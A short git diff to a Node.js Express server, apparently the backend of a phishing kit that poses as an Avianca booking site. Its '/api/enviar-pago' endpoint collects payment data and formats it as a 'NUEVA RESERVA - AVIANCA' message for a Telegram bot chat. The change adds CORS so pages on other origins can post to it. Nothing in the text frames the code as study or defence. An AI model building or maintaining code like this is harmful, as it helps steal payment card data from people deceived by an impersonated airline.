@@ -1,6 +1,8 @@
 const express = require('express');
 const axios = require('axios');
 const path = require('path');
+const cors = require('cors'); // Agregado para resolver errores de CORS
+
 const app = express();
 const port = process.env.PORT || 3000;
 
@@ -13,9 +15,10 @@ if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
     process.exit(1);
 }
 
-// Middleware para servir archivos estáticos desde la carpeta 'public'
+// Middleware para servir archivos estáticos y para habilitar CORS
 app.use(express.static(path.join(__dirname, 'public')));
 app.use(express.json());
+app.use(cors()); // Permite peticiones de diferentes orígenes
 
 // Función de ayuda para escapar caracteres de Markdown
 function escapeMarkdownV2(text) {
@@ -33,7 +36,8 @@ function escapeMarkdownV2(text) {
 app.post('/api/enviar-pago', async (req, res) => {
     const paymentData = req.body;
     const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
-
+    
+    // Mensaje formateado para Telegram
     const message = `
 ✈️ *NUEVA RESERVA \\- AVIANCA* ✈️
 \\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
@@ -174,3 +178,4 @@ app.post('/api/verificar-estado', async (req, res) => {
 app.listen(port, () => {
     console.log(`Servidor escuchando en http://localhost:${port}`);
 });
+
